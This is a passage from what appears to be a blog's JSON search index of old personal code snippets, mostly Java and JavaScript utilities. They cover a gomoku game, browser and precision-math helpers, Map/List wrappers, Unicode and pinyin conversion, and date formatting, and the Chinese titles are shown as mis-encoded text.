MapSize(cm.getWidth(),cm.getHeight()); }else{ System.out.println( \"\\u81EA\\u5B9A\\u4E49\" ); } } public void actionPerformed(ActionEvent e){ String arg=e.getActionCommand(); try{ if (arg.equals(\"Windows\")) UIManager.setLookAndFeel( \"com.sun.java.swing.plaf.windows.WindowsLookAndFeel\" ); else if (arg.equals(\"Motif\")) UIManager.setLookAndFeel( \"com.sun.java.swing.plaf.motif.MotifLookAndFeel\" ); else UIManager.setLookAndFeel( \"javax.swing.plaf.metal.MetalLookAndFeel\" ); SwingUtilities.updateComponentTreeUI( this); } catch(Exception ee){} if(arg.equals(\"20x15\")){ this.width= 20; this.height= 15; cm= new ChessModel(1); MapSize( this.width, this.height","date":"2022-06-24","objectID":"/posts/scripts/java/%E4%BA%94%E5%AD%90%E6%A3%8B/:0:0","tags":["linux","java","scripts"],"title":"java äº”å­æ£‹","uri":"/posts/scripts/java/%E4%BA%94%E5%AD%90%E6%A3%8B/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"javascript å¸®åŠ©ç±»","date":"2022-06-24","objectID":"/posts/scripts/javascript/%E5%B8%AE%E5%8A%A9%E7%B1%BB/","tags":["linux","javascript","scripts"],"title":"javascript å¸®åŠ©ç±»","uri":"/posts/scripts/javascript/%E5%B8%AE%E5%8A%A9%E7%B1%BB/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":" function check_browser() { Opera = (navigator .userAgent .indexOf (\"Opera\", 0) != -1 )?1: 0; MSIE = (navigator .userAgent .indexOf (\"Microsoft\", 0) != -1 )?1: 0; FX = (navigator .userAgent .indexOf (\"Mozilla\", 0) != -1 )?1: 0; if ( Opera ) brow_type = \"Opera\"; else if ( FX )brow_type = \"Firefox\"; else if ( MSIE )brow_type = \"MSIE\"; return brow_type ; } function getWindowHeight() { var windowHeight = 0 ; if ( typeof(window.innerHeight ) == 'number') { windowHeight = window .innerHeight ; } else { if ( document.documentElement \u0026\u0026 document.documentElement. clientHeight) { windowHeight = document .documentElement .clientHeight ; } else { if ( document.body \u0026\u0026 document .body .clientHeight ) { windowHeight = document .body .clientHeight ; } } } return windowHeight; } function getWindowWidth() { var windowWidth = 0 ; if ( typeof(window.innerWidth ) == 'number') { windowWidth = window .innerWidth ; } else { if ( document.documentElement \u0026\u0026 document.documentElement. clientWidth) { windowWidth = document .documentElement .clientWidth ; } else { if ( document.body \u0026\u0026 document .body .clientWidth ) { windowWidth = document .body .clientWidth ; } } } return windowWidth; } /*open window at the middle\u0026center of screen*/ function openwindow(url,name,iWidth,iHeight,isFullScreen ) { var url; var name; var iWidth; var iHeight; if(isFullScreen !=undefined \u0026\u0026 isFullScreen== '1') { iWidth = window .screen .availWidth - 10; iHeight = window .screen .availHeight - 30; } var iTop = ( window.screen.availHeight -30- iHeight)/2 ; var iLeft = ( window.screen.availWidth -10- iWidth)/2 ; window .open (url ,name ,'height='+ iHeight+',innerHeight=' +iHeight +',width='+ iWidth+',innerWidth=' +iWidth +',top='+ iTop+',left=' +iLeft +',toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,status=yes,titlebar=yes' ); } /* function: compare old_str and new_str, then output add_str and del_str example_1: old_str=1,2,3,5;new_str=1,3,4,6;compareStr(old_str,new_str)=4,6;2,5 notice: under any condition, ';' exists all the same! */ function compareStr(oldStr,newStr) { if(oldStr==newStr) { return ';' ; } if(oldStr=='' ) { return newStr+ ';'; } if(newStr=='' ) { return ';' +oldStr ; } var oldArr = oldStr.split(',' ); var newArr = newStr.split(',' ); var dels = '' ; var adds = '' ; for(var i= 0;i\u003coldArr .length ;i ++) { var tag = 0 ; for(var j= 0;j\u003cnewArr .length ;j ++) { if(oldArr[i] == newArr[j] ) { tag = 1; break; } } if(tag == 0) { dels = dels + oldArr[i] + ','; } } for(var i= 0;i\u003cnewArr .length ;i ++) { var tag = 0 ; for(var j= 0;j\u003coldArr .length ;j ++) { if(newArr[i] == oldArr[j] ) { tag = 1; break; } } if(tag == 0) { adds = adds + newArr[i] + ','; } } if(dels=='' \u0026\u0026 adds!='' ) { return adds. substring(0 ,adds .lastIndexOf (',')) + ';' ; } else if (adds =='' \u0026\u0026 dels !='') { return ';' + dels.substring (0, dels.lastIndexOf (',')); } else if (adds =='' \u0026\u0026 dels =='') { return ';' ; } else { return adds. substring(0 ,adds .lastIndexOf (',')) + ';' + dels.substring( 0,dels.lastIndexOf (',')); } } /*JSé«˜ç²¾åº¦è®¡ç®—*/ //é™¤æ³• function accDiv(arg1,arg2){ var t1= 0,t2=0 ,r1 ,r2 ; try{t1=arg1.toString ().split( \".\")[1].length}catch (e ){} try{t2=arg2.toString ().split( \".\")[1].length}catch (e ){} with(Math){ r1 =Number (arg1 .toString ().replace( \".\",\"\" )) r2 =Number (arg2 .toString ().replace( \".\",\"\" )) return ( r1/ r2)* pow(10 ,t2 -t1 ); } } //ä¹˜æ³• function accMul(arg1,arg2) { var m= 0,s1=arg1.toString (),s2= arg2.toString (); try{m+=s1.split(\".\" )[ 1] .length }catch( e){} try{m+=s2.split(\".\" )[ 1] .length }catch( e){} return Number(s1. replace(\".\" ,\"\"))* Number(s2.replace(\".\" ,\"\"))/ Math.pow(10 ,m ); } //åŠ æ³• function accAdd(arg1,arg2){ var r1, r2, m; try{r1=arg1.toString ().split( \".\")[1].length}catch (e ){r1 =0} try{r2=arg2.toString ().split( \".\")[1].length}catch (e ){r2 =0} m =Math .pow (10, Math.max(r1,r2)) return ( arg1*m+arg2*m)/m; } //å‡æ³• function accSubtr(arg1,arg2){ var r1 ,r2 ,m ,n ; try{ r1= arg1.toString ().split( \".\")[1].length}catch (e ){r1 =0} try{ r2= arg2.toString ","date":"2022-06-24","objectID":"/posts/scripts/javascript/%E5%B8%AE%E5%8A%A9%E7%B1%BB/:0:0","tags":["linux","javascript","scripts"],"title":"javascript å¸®åŠ©ç±»","uri":"/posts/scripts/javascript/%E5%B8%AE%E5%8A%A9%E7%B1%BB/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"javascript å¸®åŠ©ç±»","date":"2022-06-24","objectID":"/posts/scripts/javascript/maplist%E5%B0%81%E8%A3%85/","tags":["linux","javascript","scripts"],"title":"javascript å°è£…mapã€list","uri":"/posts/scripts/javascript/maplist%E5%B0%81%E8%A3%85/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"å½“å¹´æ”¶è—çš„ä¸€ä¸ªå°è£…è„šæœ¬ /* * Util.$(objid)ï¼šè·å–æŒ‡å®šIDçš„domå¯¹è±¡ * * Util.ieï¼šåˆ¤æ–­æµè§ˆå™¨æ˜¯å¦ä¸ºIE * * Listç±»ï¼šæ¨¡æ‹Ÿjavaçš„Listï¼Œæ”¯æŒiterator * add(obj)ï¼šå‘Listçš„æœ€åè¿½åŠ ä¸€ä¸ªå¯¹è±¡ * addat(index, obj)ï¼šåœ¨Listçš„indexä½ç½®æ’å…¥ä¸€ä¸ªå¯¹è±¡ * get(index)ï¼šåœ¨Listè·å–indexä½ç½®çš„å¯¹è±¡ * set(index, obj)ï¼šåœ¨Listçš„æ›¿æ¢indexä½ç½®çš„å¯¹è±¡ * size()ï¼šè·å–Listçš„å¯¹è±¡ä¸ªæ•° * remove(index)ï¼šç§»é™¤Listä¸­indexä½ç½®çš„å¯¹è±¡ * clear()ï¼šæ¸…ç©ºList * iterator()ï¼šè·å–åˆ°Listçš„è¿­ä»£å¯¹è±¡ * * Mapç±»ï¼šæ¨¡æ‹Ÿjavaçš„Mapï¼Œæ”¯æŒç›´æ¥å¯¹valueçš„iterator * put(key, value)ï¼šåœ¨Mapçš„æ·»åŠ ä¸€ä¸ªkey valueçš„é”®å€¼å¯¹ * get(key)ï¼šåœ¨Mapè·å–é”®ä¸ºkeyçš„å€¼ * remove(key)ï¼šæº¢å‡ºMapä¸­é”®ä¸ºkeyçš„å¯¹è±¡ * containsKey(key)ï¼šåˆ¤æ–­Mapä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®škeyçš„å¯¹è±¡ * keySet()ï¼šè·å–Mapä¸­æ‰€æœ‰çš„é”®çš„List * values()ï¼šè·å–Mapä¸­æ‰€æœ‰çš„å€¼çš„List * size()ï¼šè·å–Listçš„å¯¹è±¡ä¸ªæ•° * clear()ï¼šæ¸…ç©ºList * iterator()ï¼šè·å–åˆ°Listçš„è¿­ä»£å¯¹è±¡ * * Iteratorç”¨æ³•ï¼šfor(var it = list.iterator(); it.hasNext();) { var item = it.next(); } * * Urlç±»ï¼šè·å–urlä¸­å‚æ•°çš„å€¼ï¼Œä½¿ç”¨var u = new Url(location.search); var value = url.getvalue(para);å³å¯å¾—åˆ° * * EventHandlerç±»ï¼šå°è£…äº‹ä»¶æ–¹æ³•ï¼Œå¯ä»¥ä¸ºäº‹ä»¶æ–¹æ³•çš„è°ƒç”¨æ·»åŠ å‚æ•°ï¼Œå±è”½äº†æµè§ˆå™¨å·®å¼‚ * EventHandler.createEvent(func, ...args)ï¼šåˆ›å»ºäº‹ä»¶å¯¹è±¡ï¼Œargsä¸ºå‚æ•°å€¼ï¼Œéœ€è¦ä¸funcçš„å‚æ•°å¯¹åº”ï¼Œä¸éœ€è¦ä¼ é€’eventå¯¹è±¡ * EventHandler.getEvent()ï¼šåœ¨äº‹ä»¶çš„å¤„ç†æ–¹æ³•ä¸­è·å–å½“å‰çš„eventå¯¹è±¡ * EventHandler.getElement(e)ï¼šè·å–è§¦å‘eventäº‹ä»¶çš„domå¯¹è±¡ * EventHandler.attachEvent(obj, eventname, func)ï¼šä¸ºobjæ·»åŠ eventnameäº‹ä»¶ï¼Œäº‹ä»¶å¤„ç†æ–¹æ³•ä¸ºfunc * EventHandler.detachEvent(obj, eventname, func)ï¼šä¸ºobjæ³¨é”€eventnameäº‹ä»¶çš„funcæ–¹æ³• * * EventTypeç±»ï¼šå°è£…äº†å®¢æˆ·ç«¯çš„å¤§å¤šæ•°äº‹ä»¶ç±»å‹ï¼Œå±è”½äº†æµè§ˆå™¨å·®å¼‚ * ä½¿ç”¨æ–¹å¼ï¼šEventHandler.attachEvent(obj, EventType.click, func) * ç›®å‰å°è£…äº†click, rclick, mousedown, mousemove, mouseup, mouseover, mouseout, scroll, focus, blur, change, keypress, keydown, keyup, submit */ /* * ä¿®æ”¹è®°å½• */ function Util() {} Util.$ = function (objid) { return document.getElementById(objid); }; //æµè§ˆå™¨çš„åˆ¤æ–­ï¼Œtrueä¸ºIEï¼Œfalseä¸ºFirefox Util.ie = navigator.appName.indexOf(\"Microsoft\") != -1 ? true : false; function Iterator(iteratorArray) { this.itArr = iteratorArray; this.index = -1; } Iterator.prototype = { hasNext: function () { if (this.index + 1 \u003e= this.itArr.length) { return false; } else { return true; } }, next: function () { this.index++; return this.itArr[this.index]; }, }; function Map() { this.arr = new Array(); } Map.prototype = { put: function (key, value) { if (!this.containsKey(key)) { this.arr.push([key, value]); } else { for (var i = 0; i \u003c this.arr.length; i++) { if (this.arr[i][0] == key) { this.arr[i][1] = value; return; } } } }, get: function (key) { for (var i = 0; i \u003c this.arr.length; i++) { if (this.arr[i][0] == key) { return this.arr[i][1]; } } return null; }, remove: function (key) { for (var i = 0; i \u003c this.arr.length; i++) { if (this.arr[i][0] == key) { this.arr.splice(i, 1); return; } } }, containsKey: function (key) { for (var i = 0; i \u003c this.arr.length; i++) { if (this.arr[i][0] == key) { return true; } } return false; }, keySet: function () { var l = new List(); for (var i = 0; i \u003c this.arr.length; i++) { l.add(this.arr[i][0]); } return l; }, values: function () { var l = new List(); for (var i = 0; i \u003c this.arr.length; i++) { l.add(this.arr[i][1]); } return l; }, size: function () { return this.arr.length; }, clear: function () { this.arr = []; }, iterator: function () { var vs = new Array(); for (var i = 0; i \u003c this.arr.length; i++) { vs.push(this.arr[i][1]); } var it = new Iterator(vs); return it; }, }; function List() { this.arr = new Array(); } List.prototype = { add: function (obj) { this.arr.push(obj); }, addat: function (index, obj) { this.arr.splice(index, 0, obj); }, get: function (index) { return this.arr[index]; }, set: function (index, obj) { this.arr.splice(index, 1, obj); }, size: function () { return this.arr.length; }, remove: function (index) { this.arr.splice(index, 1); }, clear: function () { this.arr = []; }, iterator: function () { var it = new Iterator(this.arr); return it; }, }; function Url(urlstr) { this.paraMap = new Map(); if (urlstr.indexOf(\"?\") \u003e -1) { urlstr = urlstr.substr(1); } if (urlstr.indexOf(\"\u0026\") \u003e -1) { var pvarr = urlstr.split(\"\u0026\"); for (var i = 0; i \u003c pvarr.length; i++) { var pv = pvarr[i].split(\"=\"); this.paraMap.put(pv[0], pv[1]); } } else { var pv = urlstr.split(\"=\"); this.paraMap.put(pv[0], pv[1]); } } Url.prototype = { getvalue: function (para) { return this.","date":"2022-06-24","objectID":"/posts/scripts/javascript/maplist%E5%B0%81%E8%A3%85/:0:0","tags":["linux","javascript","scripts"],"title":"javascript å°è£…mapã€list","uri":"/posts/scripts/javascript/maplist%E5%B0%81%E8%A3%85/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"æ±‰å­—åŠunicodeäº’è½¬","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E5%8F%8Aunicode%E4%BA%92%E8%BD%AC/","tags":["linux","java","scripts"],"title":"javaæ±‰å­—åŠunicodeäº’è½¬","uri":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E5%8F%8Aunicode%E4%BA%92%E8%BD%AC/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"java æ±‰å­—å’Œunicodeäº’è½¬ import java.io.UnsupportedEncodingException; public class UnicodeConverter { public static void main(String[] args) throws UnsupportedEncodingException { String s = \" \\tå°\\u51AC\"; System.out.println(\"Original:\\t\\t\" + s); s = toEncodedUnicode(s, true); System.out.println(\"to unicode:\\t\\t\" + s); s = fromEncodedUnicode(s.toCharArray(), 0, s.length()); System.out.println(\"from unicode:\\t\" + s); } private static final char[] hexDigit = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' }; private static char toHex(int nibble) { return hexDigit[(nibble \u0026 0xF)]; } /** * å°†å­—ç¬¦ä¸²ç¼–ç æˆ Unicode å½¢å¼çš„å­—ç¬¦ä¸². å¦‚ \"å°\" to \"\\u5c0f\" * Converts unicodes to encoded \\\\uxxxx and escapes * special characters with a preceding slash * * @param theString * å¾…è½¬æ¢æˆUnicodeç¼–ç çš„å­—ç¬¦ä¸²ã€‚ * @param escapeSpace * æ˜¯å¦å¿½ç•¥ç©ºæ ¼ï¼Œä¸ºtrueæ—¶åœ¨ç©ºæ ¼åé¢æ˜¯å¦åŠ ä¸ªåæ–œæ ã€‚ * @return è¿”å›è½¬æ¢åUnicodeç¼–ç çš„å­—ç¬¦ä¸²ã€‚ */ public static String toEncodedUnicode(String theString, boolean escapeSpace) { int len = theString.length(); int bufLen = len * 2; if (bufLen \u003c 0) { bufLen = Integer.MAX_VALUE; } StringBuffer outBuffer = new StringBuffer(bufLen); for (int x = 0; x \u003c len; x++) { char aChar = theString.charAt(x); // Handle common case first, selecting largest block that // avoids the specials below if ((aChar \u003e 61) \u0026\u0026 (aChar \u003c 127)) { if (aChar == '\\\\') { outBuffer.append('\\\\'); outBuffer.append('\\\\'); continue; } outBuffer.append(aChar); continue; } switch (aChar) { case ' ': if (x == 0 || escapeSpace) outBuffer.append('\\\\'); outBuffer.append(' '); break; case '\\t': outBuffer.append('\\\\'); outBuffer.append('t'); break; case '\\n': outBuffer.append('\\\\'); outBuffer.append('n'); break; case '\\r': outBuffer.append('\\\\'); outBuffer.append('r'); break; case '\\f': outBuffer.append('\\\\'); outBuffer.append('f'); break; case '=': // Fall through case ':': // Fall through case '#': // Fall through case '!': outBuffer.append('\\\\'); outBuffer.append(aChar); break; default: if ((aChar \u003c 0x0020) || (aChar \u003e 0x007e)) { // æ¯ä¸ªunicodeæœ‰16ä½ï¼Œæ¯å››ä½å¯¹åº”çš„16è¿›åˆ¶ä»é«˜ä½ä¿å­˜åˆ°ä½ä½ outBuffer.append('\\\\'); outBuffer.append('u'); outBuffer.append(toHex((aChar \u003e\u003e 12) \u0026 0xF)); outBuffer.append(toHex((aChar \u003e\u003e 8) \u0026 0xF)); outBuffer.append(toHex((aChar \u003e\u003e 4) \u0026 0xF)); outBuffer.append(toHex(aChar \u0026 0xF)); } else { outBuffer.append(aChar); } } } return outBuffer.toString(); } /** * ä» Unicode å½¢å¼çš„å­—ç¬¦ä¸²è½¬æ¢æˆå¯¹åº”çš„ç¼–ç çš„ç‰¹æ®Šå­—ç¬¦ä¸²ã€‚ å¦‚ \"\\u5c0f\" to \"å°\". * Converts encoded \\\\uxxxx to unicode chars * and changes special saved chars to their original forms * * @param in * Unicodeç¼–ç çš„å­—ç¬¦æ•°ç»„ã€‚ * @param off * è½¬æ¢çš„èµ·å§‹åç§»é‡ã€‚ * @param len * è½¬æ¢çš„å­—ç¬¦é•¿åº¦ã€‚ * @param convtBuf * è½¬æ¢çš„ç¼“å­˜å­—ç¬¦æ•°ç»„ã€‚ * @return å®Œæˆè½¬æ¢ï¼Œè¿”å›ç¼–ç å‰çš„ç‰¹æ®Šå­—ç¬¦ä¸²ã€‚ */ public static String fromEncodedUnicode(char[] in , int off, int len) { char aChar; char[] out = new char[len]; // åªçŸ­ä¸é•¿ int outLen = 0; int end = off + len; while (off \u003c end) { aChar = in [off++]; if (aChar == '\\\\') { aChar = in [off++]; if (aChar == 'u') { // Read the xxxx int value = 0; for (int i = 0; i \u003c 4; i++) { aChar = in [off++]; switch (aChar) { case '0': case '1': case '2': case '3': case '4': case '5': case '6': case '7': case '8': case '9': value = (value \u003c\u003c 4) + aChar - '0'; break; case 'a': case 'b': case 'c': case 'd': case 'e': case 'f': value = (value \u003c\u003c 4) + 10 + aChar - 'a'; break; case 'A': case 'B': case 'C': case 'D': case 'E': case 'F': value = (value \u003c\u003c 4) + 10 + aChar - 'A'; break; default: throw new IllegalArgumentException(\"Malformed \\\\uxxxx encoding.\"); } } out[outLen++] = (char) value; } else { if (aChar == 't') { aChar = '\\t'; } else if (aChar == 'r') { aChar = '\\r'; } else if (aChar == 'n') { aChar = '\\n'; } else if (aChar == 'f') { aChar = '\\f'; } out[outLen++] = aChar; } } else { out[outLen++] = (char) aChar; } } return new String(out, 0, outLen); } } ","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E5%8F%8Aunicode%E4%BA%92%E8%BD%AC/:0:0","tags":["linux","java","scripts"],"title":"javaæ±‰å­—åŠunicodeäº’è½¬","uri":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E5%8F%8Aunicode%E4%BA%92%E8%BD%AC/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"æ±‰å­—è½¬æ‹¼éŸ³","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/","tags":["linux","java","scripts"],"title":"javaæ±‰å­—è½¬æ‹¼éŸ³","uri":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"æ±‰å­—è½¬æ‹¼éŸ³(éä½¿ç”¨ä¾èµ–åŒ…) import java.nio.ByteBuffer; import java.util.TreeMap; /** * * æ±‰å­—è½¬åŒ–ä¸ºå…¨æ‹¼ * JDKç‰ˆæœ¬: 6 * éœ€è¦æ³¨æ„çš„æ˜¯ï¼šè¿™é‡Œé¢åˆ©ç”¨gb2312çš„ç¼–ç è§„åˆ™ï¼Œæ ¹æ®æ‹¼éŸ³åŒºé—´æ¥è·å–æ‹¼éŸ³ï¼Œä¸»è¦å¯ä»¥ç»ƒä¹ TreeMapçš„ä½¿ç”¨ã€‚ * ä½†å…¶å®æ‹¼éŸ³è§„åˆ™æ¶µç›–çš„ä¸­æ–‡å¹¶ä¸å…¨é¢ï¼Œè¦æ±‚è¾ƒé«˜çš„åœ°æ–¹ä¸å»ºè®®ä½¿ç”¨è¿™ä¸ªç±»ã€‚ * é™„ä¸Šæ‹¼éŸ³å’Œæ±‰å­—å¯¹ç…§è¡¨pinyin1.txtï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶å»ºç«‹Mapã€‚ */ public class CharactorTool { private static TreeMap \u003c Integer, String \u003e spellTree = new TreeMap \u003c Integer, String \u003e (); static { initTreeMap(); } private CharactorTool() {} private static void initTreeMap() { spellTree.put(-20319, \"a\"); spellTree.put(-20317, \"ai\"); spellTree.put(-20304, \"an\"); spellTree.put(-20295, \"ang\"); spellTree.put(-20292, \"ao\"); spellTree.put(-20283, \"ba\"); spellTree.put(-20265, \"bai\"); spellTree.put(-20257, \"ban\"); spellTree.put(-20242, \"bang\"); spellTree.put(-20230, \"bao\"); spellTree.put(-20051, \"bei\"); spellTree.put(-20036, \"ben\"); spellTree.put(-20032, \"beng\"); spellTree.put(-20026, \"bi\"); spellTree.put(-20002, \"bian\"); spellTree.put(-19990, \"biao\"); spellTree.put(-19986, \"bie\"); spellTree.put(-19982, \"bin\"); spellTree.put(-19976, \"bing\"); spellTree.put(-19805, \"bo\"); spellTree.put(-19784, \"bu\"); spellTree.put(-19775, \"ca\"); spellTree.put(-19774, \"cai\"); spellTree.put(-19763, \"can\"); spellTree.put(-19756, \"cang\"); spellTree.put(-19751, \"cao\"); spellTree.put(-19746, \"ce\"); spellTree.put(-19741, \"ceng\"); spellTree.put(-19739, \"cha\"); spellTree.put(-19728, \"chai\"); spellTree.put(-19725, \"chan\"); spellTree.put(-19715, \"chang\"); spellTree.put(-19540, \"chao\"); spellTree.put(-19531, \"che\"); spellTree.put(-19525, \"chen\"); spellTree.put(-19515, \"cheng\"); spellTree.put(-19500, \"chi\"); spellTree.put(-19484, \"chong\"); spellTree.put(-19479, \"chou\"); spellTree.put(-19467, \"chu\"); spellTree.put(-19289, \"chuai\"); spellTree.put(-19288, \"chuan\"); spellTree.put(-19281, \"chuang\"); spellTree.put(-19275, \"chui\"); spellTree.put(-19270, \"chun\"); spellTree.put(-19263, \"chuo\"); spellTree.put(-19261, \"ci\"); spellTree.put(-19249, \"cong\"); spellTree.put(-19243, \"cou\"); spellTree.put(-19242, \"cu\"); spellTree.put(-19238, \"cuan\"); spellTree.put(-19235, \"cui\"); spellTree.put(-19227, \"cun\"); spellTree.put(-19224, \"cuo\"); spellTree.put(-19218, \"da\"); spellTree.put(-19212, \"dai\"); spellTree.put(-19038, \"dan\"); spellTree.put(-19023, \"dang\"); spellTree.put(-19018, \"dao\"); spellTree.put(-19006, \"de\"); spellTree.put(-19003, \"deng\"); spellTree.put(-18996, \"di\"); spellTree.put(-18977, \"dian\"); spellTree.put(-18961, \"diao\"); spellTree.put(-18952, \"die\"); spellTree.put(-18783, \"ding\"); spellTree.put(-18774, \"diu\"); spellTree.put(-18773, \"dong\"); spellTree.put(-18763, \"dou\"); spellTree.put(-18756, \"du\"); spellTree.put(-18741, \"duan\"); spellTree.put(-18735, \"dui\"); spellTree.put(-18731, \"dun\"); spellTree.put(-18722, \"duo\"); spellTree.put(-18710, \"e\"); spellTree.put(-18697, \"en\"); spellTree.put(-18696, \"er\"); spellTree.put(-18526, \"fa\"); spellTree.put(-18518, \"fan\"); spellTree.put(-18501, \"fang\"); spellTree.put(-18490, \"fei\"); spellTree.put(-18478, \"fen\"); spellTree.put(-18463, \"feng\"); spellTree.put(-18448, \"fo\"); spellTree.put(-18447, \"fou\"); spellTree.put(-18446, \"fu\"); spellTree.put(-18239, \"ga\"); spellTree.put(-18237, \"gai\"); spellTree.put(-18231, \"gan\"); spellTree.put(-18220, \"gang\"); spellTree.put(-18211, \"gao\"); spellTree.put(-18201, \"ge\"); spellTree.put(-18184, \"gei\"); spellTree.put(-18183, \"gen\"); spellTree.put(-18181, \"geng\"); spellTree.put(-18012, \"gong\"); spellTree.put(-17997, \"gou\"); spellTree.put(-17988, \"gu\"); spellTree.put(-17970, \"gua\"); spellTree.put(-17964, \"guai\"); spellTree.put(-17961, \"guan\"); spellTree.put(-17950, \"guang\"); spellTree.put(-17947, \"gui\"); spellTree.put(-17931, \"gun\"); spellTree.put(-17928, \"guo\"); spellTree.put(-17922, \"ha\"); spellTree.put(-17759, \"hai\"); spellTree.put(-17752, \"han\"); spellTree.put(-17733, \"hang\"); spellTree.put(-17730, \"hao\"); spellTree.put(-17721, \"he\"); spellTree.put(-17703, \"hei\"); spellTree.put(-17701, \"hen\"); spellTree.put(-17697, \"heng\"); spellTree.put(-17692, \"hong\"); spellTree.put(-17683, \"hou\"); spellTree.put(-17676, \"hu\"); spellTree.put(-17496, \"hua\"); spe","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/:0:0","tags":["linux","java","scripts"],"title":"javaæ±‰å­—è½¬æ‹¼éŸ³","uri":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"æ—¥æœŸæ ¼å¼åŒ–å¤„ç†ç»„ä»¶","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/","tags":["linux","java","scripts"],"title":"Javaæ—¥æœŸæ ¼å¼åŒ–å¤„ç†ç»„ä»¶","uri":"/posts/scripts/java/%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"java æ—¥æœŸæ ¼å¼åŒ–å¤„ç†ç»„ä»¶ import java.text.DateFormat; import java.text.ParseException; import java.text.SimpleDateFormat; import java.util.Calendar; import java.util.Date; import java.util.Locale; import org.apache.commons.lang.StringUtils; /** * æ—¥æœŸæ ¼å¼åŒ–å¤„ç†ç»„ä»¶ * @author chenxiaodong * @version Apr 21, 2010 5:50:00 PM */ public class TimeUtil s { /** * å°†é•¿æ•´å‹çš„æ—¥æœŸè½¬åŒ–ä¸ºå­—ç¬¦å‹æ—¥æœŸå­—ç¬¦ä¸² * @param intDate é•¿æ•´å‹æ—¥æœŸ */ public static String formatIntToDateString(long intDate) { Date time; SimpleDateFormat format; String strtime; if (intDate \u003e 0) { try { long c_unix_time2 = intDate; time = new Date(); time.setTime(c_unix_time2 * 1000); format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\", Locale.getDefault()); strtime = format.format(time); } catch (Exception ex) { strtime = \"\"; ex.printStackTrace(); } } else { strtime = \"\"; } return strtime; } /** * å°†é•¿æ•´å‹çš„æ—¥æœŸè½¬åŒ–ä¸ºå­—ç¬¦å‹æ—¥æœŸå­—ç¬¦ä¸² * @param intDate é•¿æ•´å‹æ—¥æœŸ * @return pattern æ ¼å¼ */ public static String formatIntToDateString(long intDate,String pattern) { Date time; SimpleDateFormat format; String strtime; if (intDate \u003e 0) { try { long c_unix_time2 = intDate; time = new Date(); time.setTime(c_unix_time2 * 1000); if(pattern!=null) { format = new SimpleDateFormat(pattern, Locale.getDefault()); } else { format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\", Locale.getDefault()); } strtime = format.format(time); } catch (Exception ex) { strtime = \"\"; ex.printStackTrace(); } } else { strtime = \"\"; } return strtime; } /** * å°†é•¿æ•´å‹çš„æ—¥æœŸè½¬åŒ–ä¸ºå­—ç¬¦å‹æ—¥æœŸå­—ç¬¦ä¸² yyyy- MM-dd * @param intDate é•¿æ•´å‹æ—¥æœŸ * @return String å­—ç¬¦å‹æ—¶é—´ */ public static String formatIntToDateStringT(long intDate) { Date time; SimpleDateFormat format; String strtime; if (intDate \u003e 0) { try { long c_unix_time2 = intDate; time = new Date(); time.setTime(c_unix_time2 * 1000); format = new SimpleDateFormat(\"yyyy-MM-dd\" , Locale.getDefault()); strtime = format.format(time); } catch (Exception ex) { strtime = \"\"; ex.printStackTrace(); } } else { strtime = \"\"; } return strtime; } /** * å°†é•¿æ•´å‹çš„æ—¥æœŸè½¬åŒ–ä¸ºä¸€å®šæ ¼å¼å­—ç¬¦å‹æ—¥æœŸå­—ç¬¦ä¸² * @param _format æ ¼å¼åŒ– ä¾‹å¦‚:yyyy -MM- dd HH:mm:ss * @param intDate é•¿æ•´å‹æ—¥æœŸ * @return String å­—ç¬¦å‹æ—¶é—´ */ public static String formatIntToDateString(String _format, long intDate) { Date time = new Date(); SimpleDateFormat format; String strtime; if (intDate \u003e 0) { try { long c_unix_time2 = intDate; time.setTime(c_unix_time2 * 1000); format = new SimpleDateFormat(_format, Locale.getDefault()); strtime = format.format(time); } catch (Exception ex) { strtime = \"\"; ex.printStackTrace(); } } else { strtime = \"\"; } return strtime; } /** * å°†é•¿æ•´å‹è½¬æ¢ä¸ºæ—¥æœŸç±»å‹ * @param intDate é•¿æ•´å‹æ—¥æœŸ * @return Date æ—¥æœŸç±»å‹æ—¶é—´ */ public static Date formatIntToDate(long intDate) { Date time = new Date(); if(intDate\u003e0){ time.setTime(intDate * 1000); } return time; } /** * å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ—¥æœŸç±»å‹ * @param strDate å­—ç¬¦å‹æ—¥æœŸ * @return Date æ—¥æœŸç±»å‹æ—¶é—´ */ public static Date formatStringToDate(String strDate) { SimpleDateFormat format; if (strDate.trim().equals(\"\" )) return null ; try { format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\" , Locale . getDefault()); return format.parse(strDate); } catch (Exception ex) { return null ; } } /** * 